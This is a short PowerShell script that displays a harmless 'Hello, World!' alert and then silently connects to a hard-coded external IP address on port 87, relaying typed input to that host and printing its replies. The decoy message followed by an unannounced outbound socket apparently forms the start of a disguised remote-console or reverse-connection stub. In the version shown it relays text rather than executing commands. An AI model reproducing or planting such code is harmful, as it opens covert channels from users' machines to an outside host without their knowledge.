Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Create a message box with "Hello, World!" message
[System.Windows.Forms.MessageBox]::Show("Hello, World!", "PowerShell Alert", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)


$ip = "139.144.172.167"
$port = 87

try {
    $client = New-Object System.Net.Sockets.TcpClient
    $client.Connect($ip, $port)

    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)

    # Create a new console for remote output
    $remoteConsole = [System.Console]::OpenStandardOutput()
    $remoteWriter = [System.IO.StreamWriter]::new($remoteConsole)

    while ($true) {
        $input = Read-Host
        $writer.WriteLine($input)
        $writer.Flush()

        $output = $reader.ReadLine()
        if ($output -eq $null) {
            break
        }

        # Write remote console output to the local console
        $remoteWriter.WriteLine($output)
        $remoteWriter.Flush()
    }
}
catch {
    Write-Host "Failed to connect to the remote console."
}
finally {
    if ($client -ne $null) {
        $client.Close()
    }

    # Close the remote console
    if ($remoteWriter -ne $null) {
        $remoteWriter.Close()
    }
}




